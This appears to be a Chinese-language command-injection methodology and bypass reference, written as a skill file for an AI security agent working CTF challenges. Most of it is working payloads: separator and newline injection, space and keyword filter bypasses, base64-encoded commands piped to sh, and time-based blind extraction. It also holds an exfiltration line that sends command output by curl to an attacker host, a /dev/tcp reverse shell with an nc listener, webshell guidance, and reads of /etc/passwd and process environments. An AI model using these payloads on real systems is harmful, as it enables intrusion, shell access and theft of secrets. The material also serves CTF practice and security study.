# command-injection-methodology

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# 命令注入完整方法论


## Phase 1: 注入点发现
常见存在命令注入的功能: Ping工具、DNS查询、文件操作、网络诊断、系统信息页面
常见参数名: `ip`, `host`, `cmd`, `command`, `exec`, `ping`, `query`, `domain`, `address`, `ip_address`

## ⛔ 深入参考（遇到绕过时必读）

- 空格/关键字/编码绕过大全、Windows 注入、输出过滤绕过 → [references/injection-bypass.md](references/injection-bypass.md)

## Phase 2: 基础注入测试（按优先级）
**使用 `response_diff` 对比正常/注入请求的响应差异，快速定位注入点**
1. 分号: `127.0.0.1;id`
2. 换行: `%0aid`（**最可靠，通常不被过滤**）
3. 管道: `127.0.0.1|id`
4. AND/OR: `127.0.0.1 && id` / `127.0.0.1 || id`
5. 替换: `` 127.0.0.1`id` `` / `127.0.0.1$(id)`

## Phase 3: 过滤字符检测
逐个测试 `< > | & ; $ \` ( ) { } [ ]`：
- `|` 被过滤 → 用 `;` 或 `%0a`
- `;` 被过滤 → 用 `%0a` 换行
- `>` 被过滤 → 不能重定向，用其他方式外带

## Phase 4: 输出被过滤时的外泄（核心）
`%0a` 放在最前面，让原命令失败，只有你的 echo 输出：
```
ip_address=%0aecho "$(cat /FLAG.txt) packets transmitted, 0 received, 100% packet loss"
```
→ 更多外泄方法（写文件、时间盲注）→ [references/injection-bypass.md](references/injection-bypass.md)

### 盲注提取技术
- Linux 大小写敏感，路径必须全部尝试大小写组合
- 逐字符提取：`cut -c N`、awk、substr 逐字符循环提取
- 自动化脚本化：`if [ $(cut -c1 /flag) = 'F' ]; then sleep 2; fi` — 条件 sleep 布尔盲注
- 工具链：`127.0.0.1;cat /flag` 具体 payload 命令拼接
- 使用 bash 脚本或 python 脚本自动化提取

## Phase 5: Flag 路径枚举
⛔ 固定路径失败时必须用 `find` 系统搜索！
```
/flag, /FLAG, /flag.txt, /FLAG.txt, /app/flag.txt
%0afind / -name "*flag*" -o -name "*FLAG*" 2>/dev/null
env | grep -i flag    # 环境变量
cat /Dockerfile       # 确认路径
```

## Phase 6: 高级绕过速查
- 空格: `${IFS}`, `%09`, `{cat,/flag}`
- 关键字: `c'a't /flag`, `tac /flag`, `/bin/ca? /flag`
- 编码: `echo Y2F0IC9mbGFn | base64 -d | sh`
- 通配符: `cat /fla*`, `cat /FL?G.txt`

→ 完整绕过清单（含 Windows）→ [references/injection-bypass.md](references/injection-bypass.md)

## RCE 后的交互策略

拿到命令执行后，优先选择**无需持续交互**的方式：

| 优先级 | 方式 | 适用场景 |
|--------|------|----------|
| 🥇 | 直接命令输出（`; cat /flag`） | 有回显的注入 |
| 🥈 | Webshell（写 php/jsp 文件，通过 HTTP 交互） | Web 目标、有写权限 |
| 🥉 | HTTP 回传（`curl http://attacker/?d=$(cmd\|base64)`） | 盲 RCE |
| 4 | 反弹 shell → `interactive_session` | 需要持续交互（su/sudo/文件系统探索） |

如果确实需要反弹 shell（比如要提权、要 su 切用户、要进入数据库），使用 `interactive_session` 工具：
```
1. interactive_session action="start" session_name="listener" command="nc -lvp 4444" wait=2
2. 通过注入触发反弹: ; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
3. interactive_session action="read" session_name="listener"  — 确认连接
4. interactive_session action="send" session_name="listener" command="id"  — 执行命令
5. interactive_session action="send" session_name="listener" command="cat /flag.txt"
6. interactive_session action="close" session_name="listener"  — 完成后关闭
```

### 降级方案：Bash + tmux 手动交互

如果 `interactive_session` 工具不可用（MCP 版本不支持等），用 Bash 直接操作 tmux 实现相同效果：

```bash
# 1. 启动 tmux 会话运行监听
tmux new-session -d -s listener -x 200 -y 50 "nc -lvp 4444"

# 2. 触发反弹 shell（通过注入或其他方式）

# 3. 读取屏幕内容（查看是否有回连）
tmux capture-pane -t listener -p -S -100

# 4. 发送命令
tmux send-keys -t listener "id" Enter
sleep 2
tmux capture-pane -t listener -p -S -50

# 5. 继续交互
tmux send-keys -t listener "cat /flag.txt" Enter
sleep 2
tmux capture-pane -t listener -p -S -50

# 6. 发送 Ctrl-C（中断当前命令）
tmux send-keys -t listener C-c

# 7. 关闭会话
tmux kill-session -t listener
```

核心三板斧：`tmux new-session -d`（启动）、`tmux send-keys`（发命令）、`tmux capture-pane -p`（读屏幕）。这套模式适用于**任何交互式程序**——不只是 nc，SSH、mysql、redis-cli、python REPL 等都一样。

---

## CTF 命令注入技巧补充

### Bash 花括号展开（空格被过滤）
空格、`$`、`|` 等被过滤时，用花括号展开替代：
```bash
{ls,-la,/}       # 等价于: ls -la /
{cat,/flag.txt}  # 等价于: cat /flag.txt
```

### Tar 文件名注入
当服务器解压 tar 并显示文件名时，文件名中的 shell 元字符会被执行：
```bash
touch 'name; cat /flag #' && tar cf exploit.tar *
```

### 正则缺少 `$` 锚点绕过
`preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/', $ip)` 缺少 `$` 结尾锚点，追加命令即可：
```
127.0.0.1; cat /flag.txt
```


---

## REF: injection-bypass

# 命令注入绕过技术大全

## 空格被过滤的替代方案
```
${IFS}        → cat${IFS}/flag       (最常用，Bash 内置字段分隔符)
%09           → cat%09/flag          (Tab 字符，URL 编码)
$IFS$9        → cat$IFS$9/flag       ($9 是空的位置参数)
{cmd,arg}     → {cat,/flag}          (Bash 花括号展开)
<             → cat</flag            (输入重定向)
<>            → cat<>/etc/passwd     (读写重定向)
%20           → cat%20/flag          (URL 编码空格)
```

## 关键字过滤绕过

### cat 被过滤时的替代命令
```bash
tac /flag              # 反向输出
nl /flag               # 带行号输出
head /flag
tail /flag
sort /flag
rev /flag | rev        # 双重反转
xxd /flag              # 十六进制输出
base64 /flag           # Base64 编码输出
```

### 字符串拼接绕过
```bash
c'a't /flag            # 单引号中断
c""at /flag            # 双引号中断
c\at /flag             # 反斜杠转义
/bin/ca? /flag         # 通配符匹配
/bin/c[a]t /flag       # 字符类匹配
```

### 变量拼接
```bash
a=ca;b=t;$a$b /flag
```

### 编码绕过
```bash
echo Y2F0IC9mbGFn | base64 -d | sh
$(printf '\x63\x61\x74') /etc/passwd    # printf 十六进制编码
```

### 通配符
```bash
cat /fla*
cat /FL?G.txt
/???/??t /???/p??s??                     # 全路径通配
```

## Windows 命令注入

### 分隔符
```
& dir                  # 无条件执行
| dir                  # 管道
&& dir                 # AND
|| dir                 # OR
%0a dir                # 换行
```

注意：Windows 不支持反引号和 `$()`

### 空格绕过
```
type,C:\flag.txt       # 逗号分隔
```

### 变量绕过
```
set a=who&&set b=ami&&%a%%b%
```

## 输出被过滤/解析时的数据外泄

### 格式化输出绕过解析器
核心原理：用 `%0a` 放在输入最前面，让原命令没有参数→失败→只有你的 echo 输出
```
ip_address=%0aecho "$(cat /FLAG.txt) packets transmitted, 0 received, 100% packet loss"
```
注意：`%0a` 必须在最前面，不要在前面加 IP！

### 读源码找过滤逻辑和 flag 路径
```
ip_address=%0aecho "$(cat /app/app.py) packets transmitted, 0 received, 100% packet loss"
ip_address=%0aecho "$(cat /Dockerfile) packets transmitted, 0 received, 100% packet loss"
```

### 系统性 Flag 搜索（找不到 flag 时必用！）

⛔ 不要只试固定路径！用 `find` 命令系统搜索：
```
%0afind / -name "*flag*" -o -name "*FLAG*" 2>/dev/null | head -20
%0afind / -name "*.txt" -maxdepth 2 2>/dev/null
%0als -la /
%0als -la /app/
%0aenv | grep -i flag
%0acat /proc/1/environ | tr '\0' '\n' | grep -i flag
```

### 正则匹配伪造（输出解析器绕过核心）

当应用用正则提取 ping 结果（如匹配 `(\d+) packets transmitted`）时，
伪造符合正则的输出 + 嵌入 flag：
```
%0aecho "$(cat /FLAG.txt) packets transmitted, 0 received, 100% packet loss"
```

**通用模式**：先读源码找正则 → 构造匹配的输出格式 → 在匹配字段中嵌入 flag
```
# 读应用源码找正则
%0acat /app/app.py
# 读 Dockerfile 找 flag 路径
%0acat /Dockerfile
```

### 写文件到 Web 可访问路径
```
ip_address=127.0.0.1;cp /FLAG.txt /app/static/f.txt
```
然后访问 http://target/static/f.txt

### 时间盲注（完全无输出时）
```
ip_address=127.0.0.1;sleep $(cat /flag | cut -c1 | od -An -td1)
```
